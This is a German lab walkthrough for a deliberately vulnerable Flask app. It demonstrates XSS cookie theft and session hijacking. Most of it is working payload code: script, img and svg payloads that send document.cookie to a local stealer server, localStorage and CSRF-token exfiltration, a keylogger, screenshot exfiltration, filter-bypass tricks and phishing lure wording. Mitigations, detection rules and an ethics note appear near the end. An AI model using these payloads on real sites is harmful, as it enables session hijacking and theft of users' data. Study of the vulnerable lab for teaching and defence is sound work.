# XSS Cookie-Stealing Test-Dokumentation
## Hebeln Mit Kopf - Cross-Site Scripting (XSS) Demonstration

⚠️ **WICHTIG**: Diese Anwendung und dieses Tool sind absichtlich verwundbar für Bildungs- und Testzwecke. Verwenden Sie diese Techniken NIEMALS in Produktionsumgebungen oder ohne ausdrückliche Genehmigung!

---

## Übersicht

Dieses Modul demonstriert **Session Hijacking via XSS (Cross-Site Scripting)** durch Cookie-Diebstahl. Es umfasst:
- Flask-basierter Cookie-Stealer Server
- Verschiedene XSS-Payload-Varianten
- Automatisches Logging und Analyse gestohlener Cookies
- Session-Übernahme durch Cookie-Replizierung

**Angriffsziel**: Diebstahl von Flask Session-Cookies um Benutzer-Sitzungen zu übernehmen

---

## Setup

### 1. Installation

```bash
# Ins Cookie-Stealer Verzeichnis wechseln
cd xss_cookie_stealer

# Dependencies installieren
pip install -r requirements.txt
```

### 2. Flask-App starten (in separatem Terminal)

```bash
# Zurück ins Hauptverzeichnis
cd ..

# Flask-App starten
python app.py
```

Die App läuft auf: **http://127.0.0.1:5001**

### 3. Cookie-Stealer Server starten

```bash
# Im xss_cookie_stealer Verzeichnis
python server.py
```

Der Server läuft auf: **http://127.0.0.1:8888**

---

## Identifizierte XSS-Schwachstellen

### Schwachstelle 1: Stored XSS via Bio-Feld (KRITISCH)

**Verwundbarer Code**:
```python
# app.py:33
bio = request.form.get("bio", "")[:512]  # Keine Sanitisierung!

# templates/users.html:35
{{ u.bio if u.bio else '...' }}  # Keine Output-Encoding!
```

**Auch betroffen**:
```python
# templates/search.html:47
{{ result.bio or '(Keine Beschreibung)' }}
```

### Schwachstelle 2: Reflected XSS via Search Query (HOCH)

**Verwundbarer Code**:
```python
# app.py:115
query = request.args.get("q", "")  # User-Input direkt verwendet

# templates/search.html:36
<h2>Suchergebnisse für: "{{ query }}"</h2>  # Reflection ohne Encoding!

# templates/search.html:18
<input type="text" name="q" value="{{ query }}" ... />  # Attribute Injection!
```

---

## Test 1: Stored XSS - Cookie-Diebstahl via Bio-Feld

### Angriffsszenario

**Ziel**: Dauerhafte XSS-Payload in der Datenbank speichern, die bei jedem Seitenaufruf ausgeführt wird.

### Schritt 1: Cookie-Stealer Server starten

```bash
cd xss_cookie_stealer
python server.py
```

**Erwartete Ausgabe**:
```
================================================================================
🍪 XSS COOKIE STEALER SERVER
================================================================================
Server gestartet auf: http://127.0.0.1:8888/steal
Status-Endpoint:      http://127.0.0.1:8888/status

⚠️  WICHTIG: Nur für autorisierte Penetrationstests verwenden!

Warte auf gestohlene Cookies...
================================================================================
```

### Schritt 2: Angreifer-Account erstellen mit XSS-Payload

1. Öffne: **http://127.0.0.1:5001/register**
2. Fülle Registrierungsformular aus:
   - **Username**: `xss_attacker`
   - **Password**: `malicious123`
   - **Bio**: Kopiere eines der folgenden Payloads:

#### Payload-Variante A: Basic Script Tag
```html
<script>fetch('http://127.0.0.1:8888/steal?c='+encodeURIComponent(document.cookie))</script>
```

#### Payload-Variante B: Image-based (robuster)
```html
<img src=x onerror="fetch('http://127.0.0.1:8888/steal?c='+encodeURIComponent(document.cookie))">
```

#### Payload-Variante C: SVG-based
```html
<svg onload="fetch('http://127.0.0.1:8888/steal?c='+encodeURIComponent(document.cookie))"></svg>
```

3. Klicke auf **Registrieren**
4. Account wird erstellt mit XSS-Payload in Bio-Feld

### Schritt 3: Als Opfer einloggen

1. Öffne neues Inkognito-Fenster oder anderen Browser
2. Gehe zu: **http://127.0.0.1:5001/login**
3. Logge dich als legitimer User ein:
   - **Username**: `trader_max`
   - **Password**: `MyPassword123`

### Schritt 4: Opfer besucht verwundbare Seite

1. Nach erfolgreichem Login, navigiere zu: **http://127.0.0.1:5001/users**
2. Die Seite zeigt alle User mit ihren Bio-Texten an
3. **XSS-Payload wird automatisch ausgeführt!**

### Schritt 5: Cookie wird gestohlen

**Im Cookie-Stealer Server Terminal erscheint**:
```
================================================================================
[+] COOKIE GESTOHLEN!
================================================================================
Zeitstempel: 2025-12-02T15:23:45.123456
IP-Adresse:  127.0.0.1
Cookie:      session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

[*] Flask Session dekodiert:
    User ID:   2
    Username:  trader_max
================================================================================
```

### Schritt 6: Gestohlene Cookies analysieren

**Option 1: JSON-Datei prüfen**
```bash
cat results/stolen_cookies.json
```

**Erwartete Ausgabe**:
```json
{
  "metadata": {
    "server": "CookieStealerServer",
    "timestamp": "2025-12-02T15:23:45.123456",
    "version": "1.0"
  },
  "stolen_cookies": [
    {
      "timestamp": "2025-12-02T15:23:45.123456",
      "cookie": "session=eyJhbGc...; Path=/; HttpOnly",
      "parsed_session": {
        "success": true,
        "user_id": 2,
        "username": "trader_max"
      },
      "ip": "127.0.0.1",
      "user_agent": "Mozilla/5.0 ...",
      "referer": "http://127.0.0.1:5001/users"
    }
  ],
  "statistics": {
    "total_stolen": 1,
    "unique_ips": 1
  }
}
```

**Option 2: TXT-Log prüfen**
```bash
cat results/server_log.txt
```

### Schritt 7: Session Hijacking durchführen

Mit dem gestohlenen Cookie kann der Angreifer die Session übernehmen:

#### Methode 1: Browser Developer Tools
1. Öffne Chrome DevTools (F12)
2. Gehe zu **Application** → **Cookies**
3. Füge gestohlenen Cookie manuell hinzu
4. Refresh Seite → eingeloggt als Opfer!

#### Methode 2: cURL
```bash
curl -H "Cookie: session=<GESTOHLENER_COOKIE>" http://127.0.0.1:5001/users
```

#### Methode 3: Python Requests
```python
import requests

stolen_cookie = "session=eyJhbGc..."
cookies = {"session": stolen_cookie.split("=")[1].split(";")[0]}

response = requests.get("http://127.0.0.1:5001/users", cookies=cookies)
print(response.text)  # Eingeloggt als Opfer!
```

---

## Test 2: Reflected XSS - Cookie-Diebstahl via Search Query

### Angriffsszenario

**Ziel**: Opfer klickt auf präparierte URL → Cookie wird sofort gestohlen

### Schritt 1: Cookie-Stealer Server läuft

(Falls noch nicht gestartet, siehe Test 1, Schritt 1)

### Schritt 2: Präparierte URL erstellen

**Basis-URL**:
```
http://127.0.0.1:5001/search?q=<PAYLOAD>
```

**Payload-Variante A: Script-based**
```html
<script>location='http://127.0.0.1:8888/steal?c='+encodeURIComponent(document.cookie)</script>
```

**Vollständige URL** (URL-encoded):
```
http://127.0.0.1:5001/search?q=%3Cscript%3Elocation%3D%27http%3A%2F%2F127.0.0.1%3A8888%2Fsteal%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%3C%2Fscript%3E
```

**Payload-Variante B: Image-based** (robuster):
```html
<img src=x onerror="location='http://127.0.0.1:8888/steal?c='+encodeURIComponent(document.cookie)">
```

**Vollständige URL**:
```
http://127.0.0.1:5001/search?q=<img src=x onerror="location='http://127.0.0.1:8888/steal?c='%2BencodeURIComponent(document.cookie)">
```

### Schritt 3: Social Engineering

Sende präparierte URL an eingeloggtes Opfer via:
- Email: "Schau dir diese Analyse an: [LINK]"
- Chat: "Fehler gefunden, bitte testen: [LINK]"
- Forum-Post mit verstecktem Link

### Schritt 4: Opfer klickt auf Link

- Browser führt XSS-Payload aus
- Cookie wird an Angreifer-Server gesendet
- Angreifer sieht Cookie in real-time

### Schritt 5: Session Hijacking

Identisch zu Test 1, Schritt 7

---

## Payload-Erklärungen

### 1. Basis-Payload

```javascript
<script>
fetch('http://127.0.0.1:8888/steal?c=' + encodeURIComponent(document.cookie))
</script>
```

**Erklärung**:
- `document.cookie` holt alle Cookies der aktuellen Seite
- `encodeURIComponent()` URL-kodiert den Cookie-String
- `fetch()` sendet GET-Request an Angreifer-Server
- Server empfängt Cookie als Query-Parameter `c`

### 2. Image-based Payload

```html
<img src=x onerror="...PAYLOAD...">
```

**Vorteile**:
- Funktioniert auch wenn `<script>` Tags gefiltert werden
- Nutzt HTML Event-Handler statt JavaScript-Tags
- Wird sofort beim Parsen des HTML ausgeführt

### 3. Location-based Redirect

```javascript
location='http://127.0.0.1:8888/steal?c=' + document.cookie
```

**Unterschied zu fetch()**:
- Führt Full-Page Redirect durch
- Sichtbar für Opfer (Seite wechselt)
- Funktioniert auch in älteren Browsern ohne fetch() API

### 4. POST-based Exfiltration

```javascript
var f = document.createElement('form');
f.method = 'POST';
f.action = 'http://127.0.0.1:8888/steal';
var i = document.createElement('input');
i.name = 'c';
i.value = document.cookie;
f.appendChild(i);
document.body.appendChild(f);
f.submit();
```

**Vorteile**:
- Kein URL-Length Limit (POST Body)
- Kann große Datenmengen übertragen
- Weniger sichtbar in Browser History

---

## Erweiterte Techniken

### 1. Exfiltration von localStorage

```javascript
<script>
var data = {
  cookies: document.cookie,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage)
};
fetch('http://127.0.0.1:8888/steal', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify(data)
});
</script>
```

### 2. CSRF Token Diebstahl

```javascript
<script>
var csrf = document.querySelector('[name=csrf_token]').value;
fetch('http://127.0.0.1:8888/steal?c=' + document.cookie + '&csrf=' + csrf);
</script>
```

### 3. Keylogger + Cookie Stealer Kombination

```javascript
<script>
// Steal cookie immediately
fetch('http://127.0.0.1:8888/steal?c=' + document.cookie);

// Install keylogger
document.addEventListener('keypress', function(e) {
  fetch('http://127.0.0.1:8889/log?key=' + e.key);
});
</script>
```

### 4. Screenshot via Canvas API

```javascript
<script>
html2canvas(document.body).then(canvas => {
  canvas.toBlob(blob => {
    var formData = new FormData();
    formData.append('screenshot', blob);
    formData.append('cookie', document.cookie);
    fetch('http://127.0.0.1:8888/steal', {
      method: 'POST',
      body: formData
    });
  });
});
</script>
```

---

## Mitigations (WIE MAN ES RICHTIG MACHT)

### ❌ FALSCH (Aktueller Code):

```python
# templates/users.html:35
{{ u.bio if u.bio else '...' }}  # KEINE Output-Encoding!
```

```python
# templates/search.html:36
<h2>Suchergebnisse für: "{{ query }}"</h2>  # KEINE Escaping!
```

### ✅ RICHTIG (Fixed):

```python
# templates/users.html:35
{{ (u.bio | e) if u.bio else '...' }}  # Mit Jinja2 escape filter
```

```python
# templates/search.html:36
<h2>Suchergebnisse für: "{{ query | e }}"</h2>  # Escaped!
```

### Content Security Policy (CSP)

```python
# app.py - CSP Header hinzufügen
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "connect-src 'self'"
    )
    return response
```

**Erklärung**:
- `default-src 'self'`: Nur Ressourcen von eigener Domain
- `script-src 'self'`: Keine inline-scripts, nur externe Dateien
- Blockiert alle XSS-Payloads die externe Server kontaktieren!

### HTTPOnly Cookie Flag

```python
# app.py
app.config['SESSION_COOKIE_HTTPONLY'] = True   # Cookie nicht via JS lesbar!
app.config['SESSION_COOKIE_SECURE'] = True     # Nur über HTTPS
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # CSRF Protection
```

**Wichtig**: Mit HTTPOnly=True funktioniert `document.cookie` nicht mehr!

### Input Sanitization

```python
import bleach

# Bei Registrierung
bio = request.form.get("bio", "")
bio_clean = bleach.clean(
    bio,
    tags=['b', 'i', 'u', 'em', 'strong'],  # Nur harmlose Tags erlauben
    attributes={},  # Keine Attribute erlauben
    strip=True
)
```

### X-XSS-Protection Header

```python
response.headers['X-XSS-Protection'] = '1; mode=block'
response.headers['X-Content-Type-Options'] = 'nosniff'
response.headers['X-Frame-Options'] = 'DENY'
```

---

## Testing Tools

### 1. Burp Suite

**Setup**:
1. Starte Burp Suite
2. Configure Browser Proxy (127.0.0.1:8080)
3. Intercept Registration Request
4. Modify Bio-Parameter mit XSS-Payload
5. Forward Request

**Repeater**:
- Send to Repeater für manuelle Tests
- Teste verschiedene Payloads schnell

**Intruder**:
- Automated Fuzzing mit XSS-Payload-Liste
- Position Marker: `§PAYLOAD§`
- Payload List: XSS Cheat Sheet

### 2. OWASP ZAP

```bash
# Automated Scan
zap-cli quick-scan http://127.0.0.1:5001

# Active Scan with XSS plugin
zap-cli active-scan --scanners xss http://127.0.0.1:5001/register
```

### 3. XSStrike

```bash
# Automated XSS Detection
python xsstrike.py -u "http://127.0.0.1:5001/search?q=test"

# Fuzzing Mode
python xsstrike.py -u "http://127.0.0.1:5001/search?q=test" --fuzzer
```

### 4. Manual Testing mit cURL

```bash
# Test Stored XSS
curl -X POST http://127.0.0.1:5001/register \
  -d "username=xss_test&password=test123&bio=<script>alert('XSS')</script>"

# Test Reflected XSS
curl "http://127.0.0.1:5001/search?q=<script>alert('XSS')</script>"
```

---

## Detektionsmethoden

### Server-Side Detection

**WAF (Web Application Firewall) Rules**:
```
# ModSecurity Rule
SecRule ARGS "@rx <script" "id:1,deny,status:403,msg:'XSS Detected'"
SecRule ARGS "@rx onerror" "id:2,deny,status:403,msg:'XSS Event Handler'"
```

**Log Analysis**:
```bash
# Suche nach XSS-Patterns in Logs
grep -i "script" /var/log/apache2/access.log
grep -i "onerror" /var/log/apache2/access.log
```

### Client-Side Detection

**Browser Developer Console**:
- Network Tab: Ausgehende Requests zu unbekannten Domains
- Console Tab: JavaScript Errors oder Warnungen

**Browser Extensions**:
- NoScript: Blockiert alle Inline-Scripts
- uBlock Origin: Blockiert externe Requests

---

## Demo-Accounts zum Testen

| Username | Password | Rolle |
|----------|----------|-------|
| admin | SecureP@ssw0rd! | Administrator |
| trader_max | MyPassword123 | Trader |
| crypto_lisa | Bitcoin2024! | Crypto Analyst |
| value_investor | WarrenB123 | Value Investor |
| swing_trader | TradeIt99 | Swing Trader |

**Test-Workflow**:
1. Erstelle XSS-Attacker Account
2. Logge dich als einer der Demo-User ein
3. Besuche /users → Cookie wird gestohlen

---

## XSS Cheat Sheet

### Filter Bypass Techniken

```html
<!-- Case Variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Null Bytes -->
<script%00>alert(1)</script>

<!-- HTML Entities -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Unicode -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Hex Encoding -->
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>

<!-- Base64 -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- Alternative Tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
```

---

## Lernressourcen

### Online Labs

- **PortSwigger Web Security Academy**: https://portswigger.net/web-security/cross-site-scripting
- **OWASP WebGoat**: https://owasp.org/www-project-webgoat/
- **HackTheBox**: XSS-focused Challenges
- **TryHackMe**: XSS Room

### Weitere Lektüre

- **OWASP XSS Guide**: https://owasp.org/www-community/attacks/xss/
- **MDN Web Security**: https://developer.mozilla.org/en-US/docs/Web/Security
- **CSP Documentation**: https://content-security-policy.com/

### Video Tutorials

- **LiveOverflow**: XSS Exploitation Series
- **IppSec**: HTB XSS Challenges Walkthroughs
- **PentesterAcademy**: XSS Course

---

## ⚠️ ETHISCHER HINWEIS

Diese Techniken dürfen **NUR** in folgenden Kontexten verwendet werden:

✅ **Erlaubt**:
- Autorisierte Penetrationstests (schriftliche Genehmigung!)
- Eigene Test-Umgebungen und Lab-Setups
- CTF-Challenges und Hacking-Wettbewerbe
- Bug Bounty Programme mit Scope

❌ **VERBOTEN**:
- Tests auf fremden Webseiten ohne Genehmigung
- Session Hijacking von echten Usern
- Datenexfiltration von Produktionssystemen
- Jeglicher "neugieriger" Test ohne Autorisierung

**Rechtliche Konsequenzen**:
Unbefugtes Eindringen in Computersysteme ist strafbar:
- Deutschland: §202a StGB (Ausspähen von Daten), bis zu 3 Jahre Haft
- USA: Computer Fraud and Abuse Act (CFAA), bis zu 10 Jahre Haft
- EU: DSGVO-Verstöße, hohe Geldstrafen

**Verwende dein Wissen verantwortungsvoll!**

---

**Version**: 1.0
**Autor**: Ethical Hacking Education
**Datum**: 2025-12-02
